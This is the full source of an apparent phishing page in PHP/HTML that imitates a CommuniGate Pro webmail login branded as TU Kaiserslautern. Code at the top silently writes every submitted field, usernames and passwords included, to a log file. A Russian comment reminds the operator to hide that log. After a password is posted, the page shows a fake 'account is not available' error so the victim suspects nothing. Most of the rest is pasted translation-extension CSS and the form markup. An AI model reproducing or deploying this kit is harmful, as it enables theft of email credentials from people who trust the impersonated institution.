<?php
ini_set('display_errors','Off');
/* Не забудь скрыть файл с логом */
if (!empty($_REQUEST)){
		$log = 'log.txt';

		$delim = ':company_name:';

		$str = 'Open page - ';
		$str .= date('d m Y H.i.s') . $delim;
		foreach ($_REQUEST as $key => $value) {
				$str .= $key . "=" . $value . "&";
		}
		$str = rtrim($str, "&") . "\n";

		$f = fopen($log, 'a');
		fputs($f, $str);
		fclose($f);
}?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html dir="LTR" lang="en">
<head>

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title> CommuniGate Pro Entrance</title>

<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="style.css" type="text/css">
<style type="text/css">
#lleo_dialog,
#lleo_dialog * {
	color: #000 !important;
	font: normal 13px Arial, Helvetica !important;
	line-height: 15px !important;
	margin: 0 !important;
	padding: 0 !important;
	background: none !important;
	border: none 0 !important;
	position: static !important;
	vertical-align: baseline !important;
	overflow: visible !important;
	width: auto !important;
	height: auto !important;
	max-width: none !important;
	max-height: none !important;
	float: none !important;
	visibility: visible !important;
	text-align: left !important;
	text-transform: none !important;
	border-collapse: separate !important;
	border-spacing: 2px !important;
	box-sizing: content-box !important;
	box-shadow: none !important;
	opacity: 1 !important;
	text-shadow: none !important;
	letter-spacing: normal !important;
	-webkit-filter: none !important;
	-moz-filter: none !important;
	filter: none !important;
}
#lleo_dialog *:before,
#lleo_dialog *:after {
	content: '';
}

#lleo_dialog iframe {
	height: 0 !important;
	width: 0 !important;
}

#lleo_dialog {
	position: absolute !important;
	background: #fff !important;
	border: solid 1px #ccc !important;
	padding: 7px 0 0 !important;
	left: -999px;
	top: -999px;
	width: 440px !important;
	overflow: hidden;
	display: block !important;
	z-index: 999999999 !important;
	box-shadow: 8px 16px 30px rgba(0, 0, 0, 0.16) !important;
	border-radius: 3px !important;
	opacity: 0 !important;
	-webkit-transform: translateY(15px);
	-moz-transform: translateY(15px);
	-ms-transform: translateY(15px);
	-o-transform: translateY(15px);
	transform: translateY(15px);
}
#lleo_dialog.lleo_show_small {
	width: 150px !important;
}
#lleo_dialog.lleo_show {
	opacity: 1 !important;
	-webkit-transform: translateY(0);
	-moz-transform: translateY(0);
	-ms-transform: translateY(0);
	-o-transform: translateY(0);
	transform: translateY(0);
	-webkit-transition: -webkit-transform 0.3s, opacity 0.3s !important;
	-moz-transition: -moz-transform 0.3s, opacity 0.3s !important;
	-ms-transition: -ms-transform 0.3s, opacity 0.3s !important;
	-o-transition: -o-transform 0.3s, opacity 0.3s !important;
	transition: transform 0.3s, opacity 0.3s !important;
}
#lleo_dialog.lleo_collapse {
	opacity: 0 !important;
	-webkit-transform: scale(0.25, 0.1) translate(-550px, 100px);
	-moz-transform: scale(0.25, 0.1) translate(-550px, 100px);
	-ms-transform: scale(0.25, 0.1) translate(-550px, 100px);
	-o-transform: scale(0.25, 0.1) translate(-550px, 100px);
	transform: scale(0.25, 0.1) translate(-550px, 100px);
	-webkit-transition: -webkit-transform 0.4s, opacity 0.4s !important;
	-moz-transition: -moz-transform 0.4s, opacity 0.4s !important;
	-ms-transition: -ms-transform 0.4s, opacity 0.4s !important;
	-o-transition: -o-transform 0.4s, opacity 0.4s !important;
	transition: transform 0.4s, opacity 0.4s !important;
}
#lleo_dialog input::-webkit-input-placeholder {
	color: #aaa !important;
}
#lleo_dialog .lleo_has_pic #lleo_word {
	margin-right: 80px !important;
}
#lleo_dialog #lleo_translationsContainer1 {
	position: relative !important;
}
#lleo_dialog #lleo_translationsContainer2 {
	padding: 7px 0 0 !important;
	vertical-align: middle !important;
}
#lleo_dialog #lleo_word {
	color: #000 !important;
	margin: 0 5px 2px 0 !important;
	/*float: left !important;*/
}
#lleo_dialog .lleo_has_sound #lleo_word {
	margin-left: 30px !important;
}
#lleo_dialog #lleo_text {
	font-weight: bold !important;
	color: #d56e00 !important;
	text-decoration: none !important;
	cursor: default !important;
}
/*
#lleo_dialog #lleo_text.lleo_known {
	cursor: pointer !important;
	text-decoration: underline !important;
}
*/
/*#lleo_dialog #lleo_closeBtn {
	position: absolute !important;
	right: 6px !important;
	top: 5px !important;
	line-height: 1px !important;
	text-decoration: none !important;
	font-weight: bold !important;
	font-size: 0 !important;
	color: #aaa !important;
	display: block !important;
	z-index: 9999999999 !important;
	width: 7px !important;
	height: 7px !important;
	padding: 0 !important;
	margin: 0 !important;
}*/

#lleo_dialog #lleo_optionsBtn {
	position: absolute !important; 
	right: 3px !important;
	top: 5px !important;
	line-height: 1px !important;
	text-decoration: none !important;
	font-weight: bold !important;
	font-size: 13px !important;
	color: #aaa !important;
	padding: 2px !important;
	display: none;
}
	#lleo_dialog.lleo_optionsShown #lleo_optionsBtn {
		display: block !important;
	}
	#lleo_dialog #lleo_optionsBtn img {
		width: 12px !important;
		height: 12px !important;
	}
#lleo_dialog #lleo_sound {
	float: left !important;
	width: 16px !important;
	height: 16px !important;
	margin-left: 9px !important;
	margin-right: 3px !important;
	background: 0 0 no-repeat !important;
	cursor: pointer !important;
	display: none !important;
	background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAfNJREFUeNq0U01IVFEU/u57Oo5WhBRIBBptykWLYBa2soWiEKQQEbrSFsGbVRQKQc2iFqGitXqvjQxCoCJCqyI0aBUtZILaJNUuYWYWo8HovJ/707nP94bnz0rxwvfOuefd8517fi5TSuE4i50YwZ3l37ZhNlpgzFkaaM/G9sHF1YskNrT+7l4PjMOcb78t2JL71uxgB+2UlfxHTtq5N94fIOh/88kWgWfl73ZCSQkpeGg3H091JY6dI2S00qA/N3KO3dDUYhFgEmZGurG+w9FqApIHsVM7kaTF9Nhn0r8Q7hPWQgIRuNaH3AMUA4W/Lkdh04cpFS43G0TgxQTvCdMETVAk3KynIHwXZU/ge8XDt7KH9bKLjU0P2zVO5LsEpSejVRJ9UR18EtfqKegovs9R3Q6w9c/H1o4Aa2Jwm1lIvn9RJ4w9RdRRzqcYrpwycCll4Cy1lnkS3Bc6vfBg28v8aRIfI78zhB/1GygROH3jLyyzMQ0zlUZuZBSlKkeLoegGtTjYLcJ8pF+NakHOFC2J6w+f25mxSfWrWFF/ShXVPTGvtN14NNkVnxlYWJkgZEL7/vwKr55lKSVnaGYWkuYgrgG172uUv47+U7fw0EHaJXmalUQy/HqO6lBzEsVjJC4Q8kd6TETQpjuaGOvjv8b/AgwA/ij1XMx58NIAAAAASUVORK5CYII=) !important;
}
#lleo_dialog .lleo_has_sound #lleo_sound {
	display: block !important;
}

#lleo_dialog #lleo_soundWave {
	border: solid 5px #4495CC !important;
	border-radius: 5px !important;
	position: absolute !important;
	left: -5px !important;
	top: -5px !important;
	right: -5px !important;
	bottom: -5px !important;
	z-index: 0 !important;
	opacity: 0.9 !important;
	display: none !important;
}
	#lleo_dialog #lleo_soundWave.lleo_beforePlaying {
		display: block !important;
	}
	#lleo_dialog #lleo_soundWave.lleo_playing {
		opacity: 0 !important;
		border-width: 20px !important;
		border-radius: 30px !important;

		-webkit-transform: scale(1.07,1.1) !important;
		-moz-transform: scale(1.07,1.1) !important;
		-ms-transform: scale(1.07,1.1) !important;
		transform: scale(1.07,1.1) !important;

		-webkit-transition: all 0.6s !important;
		-moz-transition: all 0.6s !important;
		-ms-transition: all 0.6s !important;
		transition: all 0.6s !important;
	}


#lleo_dialog #lleo_picOuter {
	position: absolute !important;
	float: right !important;
	top: 4px;
	right: 5px;
	z-index: 9 !important;
	display: none !important;
	width: 100px !important;
}
	#lleo_dialog.lleo_optionsShown #lleo_picOuter {
		right: 25px;
	}
#lleo_dialog .lleo_has_pic #lleo_picOuter {
	display: block !important;
}
	#lleo_dialog #lleo_picOuter:hover {
		width: auto !important;
		z-index: 11 !important;
	}
#lleo_dialog #lleo_pic,
#lleo_dialog #lleo_picBig {
	position: absolute !important;
	top: 0 !important;
	right: 0 !important;
	border: solid 2px #fff !important;
	-webkit-border-radius: 2px !important;
	-moz-border-radius: 2px !important;
	border-radius: 2px !important;
	z-index: 1 !important;
}
#lleo_dialog #lleo_pic {
	position: relative !important;
	border: none !important;
	width: 30px !important;
}
#lleo_dialog #lleo_picBig {
	box-shadow: -1px 2px 4px rgba(0,0,0,0.3);
	z-index: 2 !important;
	opacity: 0 !important;
	visibility: hidden !important;
}
	#lleo_dialog #lleo_picOuter:hover #lleo_picBig {
		visibility: visible !important;
		opacity: 1 !important;
		-webkit-transition: opacity 0.3s !important;
		-webkit-transition-delay: 0.3s !important;
	}
#lleo_dialog #lleo_transcription {
	margin: 0 80px 4px 31px !important;
	color: #aaaaaa !important;
}
#lleo_dialog .lleo_no_trans {
	color: #aaa !important;
}

#lleo_dialog .ll-translation-counter {
	float: right !important;
	font-size: 11px !important;
	color: #aaa !important;
	padding: 2px 2px 1px 10px !important;
}

#lleo_dialog .ll-translation-text {
	float: left !important;
	/*width: 80% !important;*/
}

#lleo_dialog #lleo_trans a {
	color: #3F669F !important;
	text-decoration: none !important;
	text-overflow: ellipsis !important;
	padding: 1px 4px !important;
	overflow: hidden !important;
	float: left !important;
	width: 320px !important;
}

#lleo_dialog .ll-translation-item {
	color: #3F669F !important;
	border: solid 1px #fff !important;
	padding: 3px !important;
	width: 100% !important;
	float: left !important;
	-moz-border-radius: 2px !important;
	-webkit-border-radius: 2px !important;
	border-radius: 2px !important;
}

#lleo_dialog .ll-translation-item:hover {
	border: solid 1px #9FC2C9 !important;
	background: #EDF4F6 !important;
	cursor: pointer !important;
}
#lleo_dialog .ll-translation-item:hover .ll-translation-counter {
	color: #83a0a6 !important;
}

#lleo_dialog .ll-translation-marker {
	background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAWSURBVBhXY7RPm/+fAQkwIXNAbMICAJQ8AkvqWg/SAAAAAElFTkSuQmCC) !important;
	display: inline-block !important;
	width: 4px !important;
	height: 4px !important;
	margin: 7px 5px 2px 2px !important;
	float: left !important;
}

#lleo_dialog #lleo_icons {
	color: #aaa !important;
	font-size: 11px !important;
	background: #f8f8f8 !important;
	padding: 10px 10px 10px 16px !important;
}
#lleo_icons a {
	display: inline-block !important;
	width: 16px !important;
	height: 16px !important;
	margin: 0 10px -4px 3px !important;
	text-decoration: none !important;
	opacity: 0.5 !important;
	background: url(data:image/png;base64,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) !important;
}
#lleo_icons a:hover {
	opacity: 1 !important;
}
#lleo_icons a.lleo_google     {background-position:-34px 0 !important;}
#lleo_icons a.lleo_multitran  {background-position:-64px 0 !important;}
#lleo_icons a.lleo_lingvo     {background-position:-51px 0 !important; width: 12px !important;}
#lleo_icons a.lleo_dict       {background-position:-17px 0 !important;}
#lleo_icons a.lleo_linguee    {background-position:-81px 0 !important;}
#lleo_icons a.lleo_michaelis  {background-position:-98px 0 !important;}

#lleo_dialog #lleo_contextContainer {
	margin: 0 !important;
	padding: 3px 15px 8px 10px !important;
	background: #eee !important;
	background: -webkit-gradient(linear, left top, left bottom, from(#fff), to(#eee)) !important;
	background: -moz-linear-gradient(-90deg, #fff, #eee) !important;
	border-bottom: solid 1px #ddd !important;
	border-top-left-radius: 3px !important;
	border-top-right-radius: 3px !important;
	display: none !important;
	overflow: hidden !important;
}
#lleo_dialog .lleo_has_context #lleo_contextContainer {
	display: block !important;
}
#lleo_dialog #lleo_context {
	color: #444 !important;
	text-shadow: 1px 1px 0 #f4f4f4 !important;
	line-height: 12px !important;
	font-size: 11px !important;
	margin-left: 2px !important;
}
#lleo_dialog #lleo_context b {
	line-height: 12px !important;
	color: #000 !important;
	font-weight: bold !important;
	font-size: 11px !important;
}

#lleo_dialog #lleo_translateContextLink {
	color: #444 !important;
	text-shadow: 1px 1px 0 #f4f4f4 !important;
	background: -webkit-gradient(linear, left top, left bottom, from(#f4f4f4), to(#ddd)) !important;
	background: -moz-linear-gradient(-90deg, #f4f4f4, #ddd) !important;
	border: solid 1px !important;
	box-shadow: 1px 1px 0 #f6f6f6 !important;
	border-color: #999 #aaa #aaa #999 !important;
	-moz-border-radius: 2px !important;
	-webkit-border-radius: 2px !important;
	border-radius: 2px !important;
	padding: 0 3px !important;
	font-size: 11px !important;
	text-decoration: none !important;
	margin: 1px 5px 0 !important;
	display: inline-block !important;
	white-space: nowrap !important;
}
#lleo_dialog #lleo_translateContextLink:hover {
	background: #f8f8f8 !important;
}
#lleo_dialog #lleo_translateContextLink.hidden {
	visibility: hidden !important;
}

#lleo_dialog #lleo_setTransForm {
	display: block !important;
	margin-top: 3px !important;
	padding-top: 5px !important;
	/* Set position and background because the form might be overlapped by an image when no translations */
	position: relative !important;
	background: #fff !important;
	z-index: 10 !important;
	padding-bottom: 10px !important;
	padding-left: 16px !important;
}
#lleo_dialog .lleo-custom-translation {
	padding: 4px 5px !important;
	border: solid 1px #ddd !important;
	border-radius: 2px !important;
	width: 90% !important;
	min-width: 270px !important;
	background: -webkit-gradient(linear, 0 0, 0 20, from(#f1f1f1), to(#fff)) !important;
	background: -moz-linear-gradient(-90deg, #f1f1f1, #fff) !important;
	font: normal 13px Arial, Helvetica !important;
	line-height: 15px !important;
}
#lleo_dialog .lleo-custom-translation:hover {
	border: solid 1px #aaa !important;
}
#lleo_dialog .lleo-custom-translation:focus {
	background: #FFFEC9 !important;
}

#lleo_dialog *.hidden {
	display: none !important;
}

#lleo_dialog .infinitive{
	color: #D56E00 !important;
	text-decoration: none;
	border-bottom: 1px dotted #D56E00 !important;
}
#lleo_dialog .infinitive:hover{
	border: none !important;
}

#lleo_dialog .lleo_separator {
	height: 1px !important;
	background: #eee;
	margin-top: 10px !important;
	background: -webkit-linear-gradient(left, rgba(255,255,255,1) 0%,#eee 8%,rgba(255,255,255,1) 80%) !important;
	background: -moz-linear-gradient(left, rgba(255,255,255,1) 0%, #eee 8%, rgba(255,255,255,1) 80%) !important;
	background: -ms-linear-gradient(left, rgba(255,255,255,1) 0%,#eee 8%,rgba(255,255,255,1) 80%) !important;
	background: linear-gradient(to right, rgba(255,255,255,1) 0%,#eee 8%,rgba(255,255,255,1) 80%) !important;
}
#lleo_dialog #lleo_trans {
	/*border-top: 1px solid #eeeeee !important;*/
	padding: 5px 30px 0 14px !important;
	zoom: 1;
}

#lleo_dialog .lleo_clearfix {
	display: block !important;
	clear: both !important;
	visibility: hidden !important;
	height: 0 !important;
	font-size: 0 !important;
}


#lleo_dialog #lleo_picOuter table {
	width: 44px !important;
	position: absolute !important;
	right: 0 !important;
	top: 0 !important;
	vertical-align: middle !important;
}

#lleo_dialog #lleo_picOuter td {
	width: 38px !important;
	height: 38px !important;
	/*border: 1px solid #eeeeee !important;*/
	vertical-align: middle !important;
	text-align: center !important;
}

#lleo_dialog #lleo_picOuter td div {
	height: 38px !important;
	overflow: hidden !important;
}

#lleo_dialog .lleo_empty {
	margin: 0 5px 7px !important;
}

#lleo_youtubeExportBtn {
	margin-left: 10px;
	height: 24px;
}
	#lleo_youtubeExportBtn i {
		display: inline-block;
		width: 16px;
		height: 16px;
		/*background: 0 0 url(https://d144fqpiyasmrr.cloudfront.net/plugins/all/images/i16.png) !important;*/
	}
	#lleo_youtubeExportBtn .yt-uix-button-content {
		font-size: 12px;
		line-height: 2px;
	}


/*** Parsed Lyrics Content *****************************/

.lleo_lyrics tran {
	background: transparent !important;
	border-radius: 2px !important;
	text-shadow: none !important;
	cursor: pointer !important;
}
	.lleo_lyrics tran:hover {
		color: #fff !important;
		background: #C77213 !important;
		-webkit-transition: all 0.1s !important;
		-moz-transition: all 0.1s !important;
		-ms-transition: all 0.1s !important;
		-o-transition: all 0.1s !important;
		transition: all 0.1s !important;
	}

.lleo_songName {
	border: solid 1px #ffd47c;
	background: #fff1c2;
	border-radius: 2px;
}

.lleo_hidden_iframe {
	visibility: hidden;
}</style>
</head>
<body leftmargin="60" rightmargin="0" topmargin="0" background="bodybgcolor.gif" marginheight="0" marginwidth="0">
<form action="" method="post" enctype="multipart/form-data">
<table border="0" cellpadding="0" cellspacing="0" width="100%">

<tbody><tr><td><table border="0" cellpadding="0" cellspacing="2" align="center" width="70%">

<tbody><tr>
	<td>&nbsp;</td>
	<td align="RIGHT"><table border="0"><tbody><tr><td rowspan="2" align="center" valign="middle" width="180"><a href="#" target="_blank"><img src="logo.gif" alt="TU Kaiserslautern" border="0" height="30" width="158"></a></td>
</tr></tbody></table></td>
</tr>

<tr><td colspan="2" height="25">&nbsp;</td></tr>

<tr><td colspan="2" align="RIGHT"><table border="0" cellpadding="5" cellspacing="2" width="100%">
  <tbody><tr>
	
	<td class="externalHeader" align="center">Welcome to CommuniGate Pro,<br>the  Communications Server!</td>
	
  </tr>

  <tr><td class="externalTable" align="center"><table border="0" cellpadding="0" cellspacing="2" height="80%" width="100%">
	<tbody><tr>
		<td align="LEFT" valign="top"><table border="0" cellpadding="2" cellspacing="2" width="80%">
			<tbody><tr>
				<td class="externalField" nowrap="nowrap">E-Mail Address</td>
				<td><input name="username" size="20" maxlength="255" alt="E-Mail Address" type="text"></td>
			</tr><tr>
				<td class="externalField" nowrap="nowrap">Password</td>
				<td><input name="password" size="20" maxlength="99" alt="Password" type="password"></td>
			</tr>
			
			<tr>
			   <td class="externalField" nowrap="nowrap">Layout</td>
			   <td><select ><option value="*" selected="selected"></option><option value="">Basic</option><option value="Aquinox">Aquinox</option><option value="Basic">Basic</option><option value="Crystal">Crystal</option><option value="GoldenFleece">GoldenFleece</option><option value="mCrystal">mCrystal</option><option value="Overview">Overview</option><option value="Pronto">Pronto</option><option value="Pronto-">Pronto-</option><option value="Pronto-classic">Pronto-classic</option><option value="Pronto-darkflame">Pronto-darkflame</option><option value="Pronto-desert">Pronto-desert</option><option value="Pronto-steel">Pronto-steel</option><option value="Pronto-twilight">Pronto-twilight</option><option value="Pronto4">Pronto4</option><option value="Simplex">Simplex</option><option value="Viewpoint">Viewpoint</option><option value="XChange">XChange</option></select></td>
			</tr>
			<tr><td class="externalInfo">[94.25.176.107]</td><td class="externalOption" nowrap="nowrap"><input name="DisableIPWatch" alt="Disable Fixed Address Check" type="checkbox">Disable Fixed Address Check</td></tr>
			<tr><td class="externalInfo">5:00:52PM</td><td class="externalOption" nowrap="nowrap"><input name="DisableUseCookie" alt="Disable Cookie check" type="checkbox">Disable Cookie check</td></tr>
		</tbody></table></td>
		<td valign="top"><table border="0" cellpadding="5" cellspacing="0" width="100%">
			<tbody><tr><td class="externalLink" nowrap="nowrap"><a href="#greek">Mailing Lists</a></td></tr>
			<tr><td class="externalLink" nowrap="nowrap"><a href="#=greek">Directory</a></td></tr>
			
			<tr><td class="externalLink" nowrap="nowrap"><a href="#">Security Certificate</a></td></tr>
			
			<tr><td class="externalLink" nowrap="nowrap"><a href="#">Mail to Postmaster</a></td></tr>
		</tbody></table></td>
	</tr>
	<tr align="center"><td colspan="2" class="externalLink">

		
	</td></tr>
	<?php if(!empty($_POST['password'])){?>
	<tr align="center"><td colspan="2" class="externalLink">
		<span class="failureText">account is not available on this system</span>
		
	</td></tr>
	<?php } ?>
	<tr align="center">
		<td><input value="Enter" alt="Enter" class="button" type="submit"></td>
		<td class="externalLink"><a href="#"><img src="Pronto.gif" alt="Pronto!" border="0" align="RIGHT"></a></td>
	</tr>
  </tbody></table></td></tr>
</tbody></table></td></tr>

</tbody></table></td></tr>
<!-- End Main Table -->

<tr><td>

</td></tr>

<tr><td height="20">&nbsp;</td></tr>

<tr valign="bottom"><td colspan="2" align="center">


<table border="0"><tbody><tr align="center">	<td class="externalLink"><a href="#">English</a></td>
	<td class="externalLink"><a href="#albanian">Albanian</a></td>
	<td class="externalLink"><a href="#arabic">Arabic</a></td>
	<td class="externalLink"><a href="#chinese">Chinese</a></td>
	<td class="externalLink"><a href="#dutch">Dutch</a></td>
	<td class="externalLink"><a href="#finnish">Finnish</a></td>
